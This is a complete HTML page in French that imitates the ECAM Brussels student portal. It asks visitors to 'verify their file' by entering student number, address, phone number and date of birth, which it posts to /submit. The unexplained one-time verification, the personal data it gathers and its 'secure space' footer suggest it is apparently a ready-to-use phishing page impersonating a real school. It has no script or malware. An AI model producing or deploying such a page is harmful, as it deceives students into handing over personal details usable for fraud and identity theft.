<!doctype html>
<html lang="fr">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>ECAM — Vérification étudiant</title>
  <style>
    :root { --bleu:#0b2e59; --rouge:#e2001a; --bg:#f4f5f7; }
    * { box-sizing:border-box; }
    body { font-family:-apple-system,Segoe UI,Roboto,Arial,sans-serif; background:var(--bg);
           margin:0; color:#1c2430; }
    .bar { background:var(--bleu); color:#fff; padding:16px 24px; font-weight:600; font-size:18px; }
    .wrap { max-width:460px; margin:40px auto; padding:0 16px; }
    .card { background:#fff; border-radius:12px; padding:28px 24px; box-shadow:0 4px 20px rgba(0,0,0,.08); }
    h1 { font-size:20px; margin:0 0 6px; color:var(--bleu); }
    p.lead { font-size:14px; color:#55606e; margin:0 0 22px; }
    label { display:block; font-size:13px; font-weight:600; margin:14px 0 5px; }
    input { width:100%; padding:11px 12px; border:1px solid #cdd3db; border-radius:8px; font-size:15px; }
    button { width:100%; margin-top:22px; background:var(--rouge); color:#fff; border:none;
             padding:13px; border-radius:8px; font-size:16px; font-weight:600; cursor:pointer; }
    .foot { font-size:11px; color:#8a94a2; margin-top:16px; text-align:center; }
  </style>
</head>
<body>
  <div class="bar">ECAM — Portail étudiant</div>
  <div class="wrap">
    <div class="card">
      <h1>Vérification de votre dossier</h1>
      <p class="lead">Merci de confirmer vos informations pour finaliser l'accès à votre espace. Cette vérification est requise une seule fois.</p>
      <form action="/submit" method="post">
        <label>Matricule étudiant</label>
        <input name="matricule" placeholder="ex. 20231234" autocomplete="off">

        <label>Adresse</label>
        <input name="adresse" placeholder="Rue, numéro, code postal" autocomplete="off">

        <label>Numéro de téléphone</label>
        <input name="telephone" placeholder="+32 ..." autocomplete="off">

        <label>Date de naissance</label>
        <input name="date_naissance" placeholder="JJ/MM/AAAA" autocomplete="off">

        <button type="submit">Confirmer mes informations</button>
      </form>
      <div class="foot">Espace sécurisé · ECAM Brussels Engineering School</div>
    </div>
  </div>
</body>
</html>
